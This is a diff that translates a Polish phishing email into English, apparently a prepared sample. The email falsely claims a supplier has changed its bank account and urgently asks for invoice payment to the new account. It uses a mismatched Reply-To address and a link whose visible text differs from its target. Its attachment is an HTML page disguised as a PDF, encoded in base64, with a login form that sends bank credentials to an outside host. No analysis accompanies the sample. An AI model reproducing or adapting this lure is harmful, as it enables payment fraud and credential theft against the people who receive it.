@@ -1,69 +1,67 @@
-From: Biurex Hurtownia <faktury@biurex-pl.example>
-To: =?utf-8?q?Gra=C5=BCyna?= Kowalska <g.kowalska@kancelaria-nowak.example>
-Reply-To: biurex.platnosci@poczta-szybka.example
-Subject: Aktualizacja numeru rachunku - FV/09/2026
+From: Biurex Office Supplies <invoices@biurex-pl.example>
+To: Grace Kowalska <g.kowalska@nowak-law.example>
+Reply-To: biurex.payments@fast-mail.example
+Subject: Bank account update - invoice FV/09/2026
 Date: Sun, 04 Oct 2026 11:00:00 +0200
 Message-ID: <a81f2c@biurex-pl.example>
-Authentication-Results: mx.kancelaria-nowak.example; spf=pass
+Authentication-Results: mx.nowak-law.example; spf=pass
  smtp.mailfrom=biurex-pl.example; dkim=none; dmarc=none
  header.from=biurex-pl.example
 MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============7232188960764948289=="
+Content-Type: multipart/mixed; boundary="===============2372444210176884379=="
 
---===============7232188960764948289==
+--===============2372444210176884379==
 Content-Type: multipart/alternative;
- boundary="===============5632940256177617495=="
+ boundary="===============3177771044974248164=="
 
---===============5632940256177617495==
+--===============3177771044974248164==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 
-Dzie=C5=84 dobry Pani Gra=C5=BCyno,
+Dear Grace,
 
-w zwi=C4=85zku ze zmian=C4=85 banku prosimy o przelew za faktur=C4=99 FV/09/2=
-026 na nowy numer rachunku:
+as we have changed banks, please pay invoice FV/09/2026 to our new account nu=
+mber:
 PL 12 3456 7890 1234 5678 9012 3456
 
-P=C5=82atno=C5=9B=C4=87 jest pilna, prosimy o realizacj=C4=99 do ko=C5=84ca d=
-nia, w przeciwnym razie b=C4=99dziemy zmuszeni wstrzyma=C4=87 dostawy.
-Faktur=C4=99 z nowym numerem przesy=C5=82amy w za=C5=82=C4=85czniku.
+The payment is urgent, please complete it by the end of the day, otherwise we=
+ will have to hold your deliveries.
+The invoice with the new account number is attached.
 
-Pozdrawiamy
-Dzia=C5=82 Ksi=C4=99gowo=C5=9Bci
-Biurex Hurtownia
+Kind regards
+Accounts Department
+Biurex Office Supplies
 
---===============5632940256177617495==
+--===============3177771044974248164==
 Content-Type: text/html; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 MIME-Version: 1.0
 
-<html><body><p>Dzie=C5=84 dobry Pani Gra=C5=BCyno,</p>
-<p>w zwi=C4=85zku ze zmian=C4=85 banku prosimy o przelew za faktur=C4=99 FV/0=
-9/2026 na <b>nowy numer rachunku</b>:<br>PL 12 3456 7890 1234 5678 9012 3456<=
-/p>
-<p>P=C5=82atno=C5=9B=C4=87 jest <b>pilna, prosimy o realizacj=C4=99 do ko=C5=
-=84ca dnia</b>, w przeciwnym razie b=C4=99dziemy zmuszeni wstrzyma=C4=87 dost=
-awy.</p>
-<p>Faktur=C4=99 z nowym numerem przesy=C5=82amy w za=C5=82=C4=85czniku. Podgl=
-=C4=85d: <a href=3D"http://biurex-faktury.example/fv">https://biurex.example/=
-faktury/FV-09-2026</a></p>
-<p>Pozdrawiamy<br>Dzia=C5=82 Ksi=C4=99gowo=C5=9Bci<br>Biurex Hurtownia</p></b=
-ody></html>
+<html><body><p>Dear Grace,</p>
+<p>as we have changed banks, please pay invoice FV/09/2026 to our <b>new acco=
+unt number</b>:<br>PL 12 3456 7890 1234 5678 9012 3456</p>
+<p>The payment is <b>urgent, please complete it by the end of the day</b>, ot=
+herwise we will have to hold your deliveries.</p>
+<p>The invoice with the new account number is attached. Preview: <a href=3D"h=
+ttp://biurex-invoices.example/fv">https://biurex.example/invoices/FV-09-2026<=
+/a></p>
+<p>Kind regards<br>Accounts Department<br>Biurex Office Supplies</p></body></=
+html>
 
---===============5632940256177617495==--
+--===============3177771044974248164==--
 
---===============7232188960764948289==
+--===============2372444210176884379==
 Content-Type: application/pdf
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="faktura_FV-09-2026.pdf.html"
+Content-Disposition: attachment; filename="invoice_FV-09-2026.pdf.html"
 MIME-Version: 1.0
 
-PCFkb2N0eXBlIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPkZha3R1cmEgRlYvMDkvMjAyNjwvdGl0
-bGU+PC9oZWFkPjxib2R5Pgo8aDM+RG9rdW1lbnQgemFiZXpwaWVjem9ueS4gWmFsb2d1aiBzacSZ
-IGRvIGJhbmt1LCBhYnkgd3nFm3dpZXRsacSHIGZha3R1csSZLjwvaDM+Cjxmb3JtIGFjdGlvbj0i
-aHR0cHM6Ly9iYW5rLXdlcnlmaWthY2phLmV4YW1wbGUvbG9naW4iIG1ldGhvZD0icG9zdCI+Cjxp
-bnB1dCBuYW1lPSJsb2dpbiIgcGxhY2Vob2xkZXI9IklkZW50eWZpa2F0b3IiPjxpbnB1dCB0eXBl
-PSJwYXNzd29yZCIgbmFtZT0iaGFzbG8iIHBsYWNlaG9sZGVyPSJIYXPFgm8iPgo8YnV0dG9uPld5
-xZt3aWV0bCBmYWt0dXLEmTwvYnV0dG9uPjwvZm9ybT48L2JvZHk+PC9odG1sPg==
+PCFkb2N0eXBlIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPkludm9pY2UgRlYvMDkvMjAyNjwvdGl0
+bGU+PC9oZWFkPjxib2R5Pgo8aDM+U2VjdXJlZCBkb2N1bWVudC4gU2lnbiBpbiB0byB5b3VyIGJh
+bmsgdG8gdmlldyB0aGUgaW52b2ljZS48L2gzPgo8Zm9ybSBhY3Rpb249Imh0dHBzOi8vYmFuay12
+ZXJpZmljYXRpb24uZXhhbXBsZS9sb2dpbiIgbWV0aG9kPSJwb3N0Ij4KPGlucHV0IG5hbWU9Imxv
+Z2luIiBwbGFjZWhvbGRlcj0iQ3VzdG9tZXIgSUQiPjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFt
+ZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCI+CjxidXR0b24+VmlldyBpbnZvaWNl
+PC9idXR0b24+PC9mb3JtPjwvYm9keT48L2h0bWw+
 
---===============7232188960764948289==--
+--===============2372444210176884379==--
